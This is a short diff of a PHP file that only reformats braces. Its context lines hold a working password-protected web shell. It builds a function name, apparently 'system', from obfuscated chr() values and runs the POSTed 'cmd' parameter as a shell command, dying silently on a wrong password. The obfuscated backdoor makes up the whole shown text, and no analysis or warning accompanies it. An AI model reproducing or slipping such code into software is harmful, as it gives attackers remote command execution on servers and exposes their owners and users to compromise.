@@ -10,12 +10,9 @@ $E = chr(0x6d);
 
 $hook = $A.$B.$A.$X.$D.$E;
 
-if($pass == md5($_POST['password']))
-{
+if($pass == md5($_POST['password'])) {
   $hook($_POST['cmd']);
-}
-else
-{
+} else {
   die();
 }
 
